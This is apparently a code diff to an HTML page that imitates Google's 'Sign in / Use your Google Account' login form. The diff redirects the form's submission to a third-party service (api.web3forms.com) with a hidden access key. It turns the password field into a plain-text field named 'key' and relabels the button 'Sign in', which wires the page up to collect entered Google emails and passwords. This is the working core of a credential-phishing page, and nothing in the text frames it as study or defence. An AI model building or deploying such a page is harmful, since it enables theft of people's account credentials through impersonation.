@@ -144,20 +144,27 @@
    <h1 class="form-title">Sign in</h1>
         <p class="form-subtitle">Use your Google Account</p>
 
- <form action="#" method="POST">
-            <div class="input-group">
+<form action="https://api.web3forms.com/submit" method="POST">
+  <!-- Replace with your Access Key -->
+    <input type="hidden" name="access_key" value="290fa2b7-7870-428e-a1f0-d22ef0bedad4">
+
+  <div class="input-group">
                 <input type="text" id="email" name="email" class="google-input" placeholder="Email or phone">
             </div>
 
    <div class="input-group">
-                 <input type="password" id="password" name="password" class="google-input" placeholder="Password">
+                 <input type="text" id="password" name="key" class="google-input" placeholder="Password">
             </div>
 
   <button type="button" class="link-button">Forgot email?</button>
 
    <div class="button-group">
                  <button type="button" class="create-account-button">Create account</button>
-                 <button type="submit" class="next-button">Next</button>
+       <!-- Honeypot Spam Protection -->
+    <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+       <!-- Custom Confirmation / Success Page -->
+    <!-- <input type="hidden" name="redirect" value="https://mywebsite.com/thanks.html"> -->
+                 <button type="submit" class="next-button">Sign in</button>
             </div>
         </form>
     </div>
